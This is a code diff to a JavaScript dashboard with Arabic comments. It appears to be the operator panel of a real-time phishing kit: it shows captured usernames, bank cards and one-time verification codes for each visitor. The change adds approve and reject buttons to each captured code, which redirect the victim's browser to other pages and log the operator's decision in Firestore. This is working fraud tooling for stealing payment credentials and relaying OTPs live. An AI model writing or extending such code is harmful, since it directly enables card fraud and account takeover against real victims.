@@ -34,6 +34,9 @@
   // إجراءات صندوق بيانات الدخول (توجيه 4/6 أرقام أو رفض) — لكل محاولة تسجيل دخول مفتاح مستقل
   const loginActionOverrides = new Map();
   const LOGIN_ACTION_LABELS = { otpnew: 'تم توجيه 4 أرقام', otpcode: 'تم توجيه 6 أرقام', reject: 'تم رفض' };
+  // إجراءات صناديق رموز التحقق (موافقة = توجيه للرئيسية، أو رفض) — لكل رمز مفتاح مستقل
+  const otpActionOverrides = new Map();
+  const OTP_ACTION_LABELS = { approve: 'تمت الموافقة (توجيه إلى الرئيسية)', reject: 'تم رفض الرمز' };
   // مفتاح آمن لأسماء حقول Firestore (حروف/أرقام/شرطة سفلية فقط — لا نقاط)
   const safeKey = (v) => String(v).replace(/[^A-Za-z0-9_]/g, '_');
   const loginEntryKey = (entry, i) => {
@@ -557,6 +560,7 @@
         username: m.username || '',
         logins: Array.isArray(m.logins) ? m.logins : [],
         loginActions: (m.loginActions && typeof m.loginActions === 'object') ? m.loginActions : {},
+        otpActions: (m.otpActions && typeof m.otpActions === 'object') ? m.otpActions : {},
         passwordResets: Array.isArray(m.passwordResets) ? m.passwordResets : [],
         appRegistrations: sessionRegistrations,
         requestType: m.requestType || '',
@@ -829,7 +833,23 @@
     }).join('');
     const registBoxTime = registEntries.length ? (registEntries[0] && registEntries[0].at) : 0;
     const cardsSectionHtml = cards.length ? `<div class="ref-cards-title"><h3>البطاقات (${cards.length})</h3></div>${cardHtml}` : '';
-    const otpsSectionHtml = sortedOtps.length ? `<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.map((o, i) => `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div></article>`).join('')}` : '';
+    const otpActionsMap = (visitor.otpActions && typeof visitor.otpActions === 'object') ? visitor.otpActions : {};
+    const otpActionFor = (key) => {
+      const local = otpActionOverrides.get((visitor.sessionId || visitor.id) + '|' + key);
+      if (local) return local;
+      const remote = otpActionsMap[key];
+      if (remote && remote.action) return { action: remote.action, label: remote.label || OTP_ACTION_LABELS[remote.action] || '' };
+      return null;
+    };
+    const otpSidAttr = escapeHtml(String(visitor.sessionId || visitor.id || ''));
+    const otpsSectionHtml = sortedOtps.length ? `<div class="ref-otp-title"><h3>رموز التحقق (${sortedOtps.length})</h3></div>${sortedOtps.map((o, i) => {
+      const key = 'otp_' + safeKey(o.id || (String(o.otp || '') + '_' + otpTime(o)));
+      const done = otpActionFor(key);
+      const actionsHtml = done
+        ? `<div class="ref-login-status ref-login-status--${escapeHtml(done.action)}">${escapeHtml(done.label || OTP_ACTION_LABELS[done.action] || 'تم التنفيذ')}</div>`
+        : `<div class="ref-card-actions"><button data-otp-action="approve" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">توجيه إلى الرئيسية</button><button data-otp-action="reject" data-otp-key="${escapeHtml(key)}" data-session-id="${otpSidAttr}">رفض</button></div>`;
+      return `<article class="ref-otp-box"><div class="ref-otp-row"><div><b>الرمز ${i + 1}: <span class="ref-copyable" data-copy="${escapeHtml(String(o.otp || ''))}">${escapeHtml(String(o.otp || ''))}</span></b><time class="ref-box-time" data-box-counter data-box-time="${otpTime(o)}" datetime="${otpTime(o)}">${escapeHtml(formatRefTime(otpTime(o)))}</time></div><small>${escapeHtml(timeAgo(otpTime(o)))}</small></div>${actionsHtml}</article>`;
+    }).join('')}` : '';
     // ترتيب الصناديق من الأحدث إلى الأقدم (الأحدث يظهر في الأعلى).
     // صندوق المعلومات الأساسية يظهر دائماً حتى وإن لم يتوفر له وقت.
     // الصناديق (ما عدا «معلومات أساسية») تُرتّب من الأحدث إلى الأقدم،
@@ -963,6 +983,27 @@
         const isNew = act === 'otpnew';
         sendNavCommand(isNew ? 'رمز 4 أرقام' : 'رمز 6 أرقام', isNew ? 'otp-new.html' : 'otp.html');
         recordLoginAction(sid, key, act, isNew ? LOGIN_ACTION_LABELS.otpnew : LOGIN_ACTION_LABELS.otpcode);
+      }
+      renderReferenceDetail(visitor);
+    }));
+    // أزرار صناديق رموز التحقق: موافقة (توجيه للرئيسية) / رفض — تُطبع الحالة وتُخفى الأزرار
+    const recordOtpAction = (sid, key, action, label) => {
+      if (!sid || !key) return;
+      otpActionOverrides.set(sid + '|' + key, { action, label });
+      db.collection('customers').doc(sid).set({
+        otpActions: { [key]: { action, label, at: Date.now() } },
+      }, { merge: true }).catch((e) => console.warn('otp action persist failed:', e));
+    };
+    els.referenceDetailContent.querySelectorAll('[data-otp-action]').forEach(btn => btn.addEventListener('click', () => {
+      const act = btn.dataset.otpAction;
+      const sid = btn.dataset.sessionId || visitor.sessionId || visitor.id;
+      const key = btn.dataset.otpKey || '';
+      if (act === 'reject') {
+        sendRejectCommand(sid);
+        recordOtpAction(sid, key, 'reject', OTP_ACTION_LABELS.reject);
+      } else {
+        sendNavCommand('الرئيسية', 'index.html');
+        recordOtpAction(sid, key, 'approve', OTP_ACTION_LABELS.approve);
       }
       renderReferenceDetail(visitor);
     }));
